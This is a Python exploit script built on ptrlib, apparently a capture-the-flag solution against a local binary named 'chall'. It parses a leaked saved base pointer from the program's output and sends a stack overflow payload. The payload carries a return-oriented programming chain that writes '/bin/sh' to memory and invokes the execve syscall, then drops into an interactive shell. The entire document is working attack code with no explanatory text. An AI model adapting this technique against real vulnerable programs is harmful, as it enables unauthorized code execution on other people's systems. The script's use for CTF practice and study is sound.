#!/home/ryohz/.pyenv/shims/python

import ptrlib as ptr


def unwrap(x):
    if x is None:
        ptr.logger.error("failed to unwrap")
        exit(1)
    else:
        return x


elf = ptr.ELF("./chall")
io = ptr.Process(elf.filepath)

io.recvuntil(b"========+===================")
io.recvline()
io.recvline()
io.recvline()

rbp = int(io.recvline().split(b" | ")[1].strip(b"  <- saved rbp"), 16)
ptr.logger.info(f"rbp: {hex(rbp)}")

payload = b"A" * 16
payload += ptr.p64(rbp)
payload += ptr.p64(next(elf.gadget("pop rdx; ret;")))
payload += b"/bin/sh\x00"
payload += ptr.p64(next(elf.gadget("pop rax; ret;")))
payload += ptr.p64(0x4BD000)
payload += ptr.p64(next(elf.gadget("mov [rax], rdx; pop rbx; ret;")))
payload += b"AAAAAAAA"
payload += ptr.p64(next(elf.gadget("pop rdi; ret;")))
payload += ptr.p64(0x4BD000)
payload += ptr.p64(next(elf.gadget("pop rsi; ret;")))
payload += ptr.p64(0)
payload += ptr.p64(next(elf.gadget("pop rdx; ret;")))
payload += ptr.p64(0)
payload += ptr.p64(next(elf.gadget("pop rax; ret;")))
payload += ptr.p64(0x3b)
payload += ptr.p64(next(elf.gadget("syscall; ret;")))

io.sendline(payload)
io.recvuntil(b"finish")
io.recvuntil(b"finish")

io.sh()
